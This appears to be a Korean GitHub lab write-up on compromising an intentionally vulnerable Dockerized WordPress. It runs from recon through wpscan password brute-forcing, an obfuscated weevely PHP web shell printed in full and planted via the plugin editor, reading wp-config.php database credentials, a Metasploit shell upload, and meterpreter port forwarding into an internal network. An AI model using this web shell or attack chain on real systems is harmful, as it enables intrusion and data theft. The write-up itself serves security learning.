![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/13f1f546-cc3c-4287-8bca-252a673443b8)
## Docker_WP_Hacking
도커 환경으로 구성한 워드프레스를 도커 취약점과 워드프레스 취약점을 이용해 해킹해보기.

## 사전준비
- 취약한 도커 이미지를 가상화 툴에 올려 준비해준다. : 192.168.146.129
- Kali Linux : 192.168.146.128
- WireShark
- Burpsuite (Decoder용도)

## 정보수집
- nmap을 통한 포트 스캔
```
sudo nmap -sV 192.168.146.129 -p-
sudo nmap -sV -sC 192.168.146.129 -p-
```

> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/0a64950c-3f19-472f-8145-93b562db515d)
> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/11b8c2fe-2e10-4cc5-81fc-26bbdedfbe16)
- /wp-admin/ 경로 정보 획득
> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/c2041775-4ecb-4186-9f02-771b675487ba)
- 8000 포트, 22번 포트 확인
> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/31d1c0dd-a66d-45b1-9984-02de893825bd)

- Nikto를 통한 정보 수집
```
sudo nikto -h http://192.168.146.129:8000/
```

> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/3cf75a46-568c-4f8c-8a2c-03bb9e1f6862)

- dirb를 통한 정보 수집
```
sudo dirb http://192.168.146.129:8000/
```
> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/170e296e-7298-4bb8-9ec1-25f0e5df1b61)

- wpscan을 통한 정보(워드프레스 플러그인 취약점) 수집
```
wpscan --url http://192.168.146.129:8000/ --enumerate p
```

> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/7979d634-5639-49df-8567-7f1fa200fac6)
> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/71539c00-8342-4b39-9c93-4b868c99b1f9)
- 메시지를 읽어보니 POST 메소드는 허용하는 것으로보아 무차별 대입공격을 허용하는 것 같다.

## brute-force 공격

-wpscan을 이용해 wordpress 계정 정보 얻기

```
wpscan --url http://192.168.146.129:8000/ --enumerate u
```

> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/b61fb484-9230-47ca-a415-76c5c4c09b5e)

- wpscan의 무차별 대입 공격 기능 사용
- github SecList의 password 모음을 사용.

```
sudo git clone https://github.com/danielmiessler/SecLists.git
sudo wpscan --url http://192.168.146.129:8000/ --passwords ~/SecLists/Passwords/Common-Credential/10-million-password-list-top-10000.txt --usernames bob
```

> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/80b80b6e-0292-4a3d-9b38-67e3c97675a0)
> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/210c83da-95ac-42e7-b7d8-c04bbb289f9c)

## 웹쉘 생성
- weevly를 사용하여 웹쉘 생성
```
sudo weevely generate hacker shell.php
cat shell.php
```

> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/466ade39-1490-4a56-b3d7-ad1a12b9d5aa)

## 웹쉘 코드 업로드
- [wordpress admin site] -> [login(bob/Welcome1)] -> [plugins] -> [Editor]

> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/1db97540-a895-4d8f-915c-5c291598a904)

```
?>
<?php
$B=str_replace('WQ','','cWQreatWQWQe_fWQuncWQtWQion');
$Z='$ku2="du26a6bc0d";$u2khu2="b10694a2du290e";$kf="u23a6964u28u2f3a03";$p=u2"g7e6u2hLIPrmHu2v7eIu2ju2";fun';
$l='u2val(@gzuncomu2pru2ess(@x(u2@base6u24_decode($m[1])u2,$k)))u2;$ou2=@ou2b_get_cou2ntentu2s();@obu2';
$A='u2"/$kh(.u2+)u2$kf/",@file_u2get_cu2ou2ntents(u2"php://inpu2uu2t"),u2$m)==1)u2 {@ob_u2su2tart();@e';
$h='2u2u2($j<$c&&$u2i<$l);$j++,u2$i++u2){u2$o.=$t{$iu2}^u2$k{$j}u2;}}returnu2 u2$o;}if (@preg_mau2tch(';
$d='_endu2u2_cleanu2();$r=u2@bu2ase64_encode(@u2x(@gu2zcompress($u2u2o),$k))u2;pu2rint("$p$kh$r$kf");}';
$G='cu2tion x($t,$k){$u2c=stru2len($ku2);$lu2u2=strlen($tu2)u2;$o="";for(u2$i=u20;$i<$l;){fu2or($j=0;u';
$k=str_replace('u2','',$Z.$G.$h.$A.$l.$d);
$C=$B('',$k);$C();
?>
<?php

```

- [Update File]


 
## 웹쉘 연결 후 내부 정보 수집

- 대부분 wordpress에서 플러그인 업로드를 하면 /wp-content/plugins/[펄러그인].php
```
http://192.168.146.129:8000/wp-content/plugins/hello.php hacker
```

- nmap 바이너리 파일을 weevely의 file_upload 모듈을 사용하여 침투한 시스템에 업로드.
- https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap 다운로드 하여 kali에 옮기기
- tmp 파일에 nmap 바이너리를 넣는 이유는 침투했을 때 권한이 www-data 이기 때문에 권한이 있는 임시 디렉토리인 tmp에 업로드 한 것이다.
```
file_upload /home/kali/Downloads/nmap /tmp/nmap
ls
chmod +x nmap
```

> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/fa80b0c0-2ce3-47dd-a159-5b42f6929c3e)

- 내부 프라이빗 ip 확인후 내부 인터넷 망 스캔

> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/67d1f594-b753-472f-8d7a-26275ef88c6e)

```
ip addr
./nmap 172.18.0.0/24
```

- nmap 결과로 보아 현재위치는 웹서비스를 제공하는 서버이다.
- 172.18.0.2 는 Database mysql 서버이다.
- 172.18.0.4 는 ssh로 내부로 접속을 하기 위한 bastion 서버로 추측 할 수있으며, 8022의 목적을 알 수 없는 포트가 열려있다.
- 일반적으로 8022 포트는 표준 SSH(Secure Shell) 포트인 22의 대안으로 사용될 수 있다.

> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/c59d3ba2-7fae-48c9-b422-aea6ca8decfb)

- db 서버가 있는 것을 확인했으니 db서버 정보를 획득 해야한다.
- wordpress 에서는 wp-config.php에 db 계정 정보가 담겨있다.

```
cd /var/www/html
ls
cat wp-config.php
```

> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/7d441bb0-b738-4597-b4cd-871aa6b8ae55)
> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/2738974d-576d-45e2-9b2b-695a5801cc91)

- 브라우저로 접속했을 때 docker환경인 것을 힌트로 얻을 수 있었지만 확실하게 한번더 확인한다.
- docker 환경에 init 프로세스는 대부분 docker 이므로
- /proc/1/cgroup 내용을 확인하여 docker 환경임을 확신한다.

```
cat /proc/1/cgroup
```

> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/8657076e-2fd2-42c7-b492-805a7873818c)



## 8022 포트 공격
- Kali에서 다른 터미널을 연다.

```
sudo msfconsole
search wp_admin
use exploit/unix/webapp/wp_admin_shell_upload
show options
set RHOSTS 192.168.146.129
set RPORT 8000
set USERNAME bob
set PASSWORD Welcome1
exploit
```
> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/12a8d10e-1035-4971-b134-92d1c9f11c37)

- 내부에 침투하여 nmap으로 내부망 서버 구성을 확인하였다.
- 미터프리터 즉 웹서비스안에 msfconsole로 침투 성공도 하였다.
- 미터프리터의 기능인 포트포워딩 기능을 이용하여 해커의 8022 포트를 연다
- 해커는 자신의 브라우저에 localhost:8022로 접속을하면 침투한 내부망의 bastion 서버인 172.18.0.4:8022로 포워딩 해준다.

```
portfwd add -l 8022 -p 8022 -r 172.18.0.4
```

> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/2c786847-330a-4c68-8ad7-42552c70097e)
> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/02d167a5-9741-47c3-87e6-9fd59ec6b476)

- 분명 172.18.0.4:8022로 포트포워딩을 했는데 172.18.0.2로 접속되었다.
- 즉 172.18.0.4:8022는 내부 db서버인 172.18.0.2로 접속하는 포트였던 것이다.
- 획득한 db정보를 통해 접속해보자.

```
mysql -u wordpress -p
Enter password : WordPressISBest
```

> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/d3f8d1d3-f2fc-4085-977b-e39f98be548f)
> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/12eb1c7b-d758-4ed7-af81-a858a0defd48)

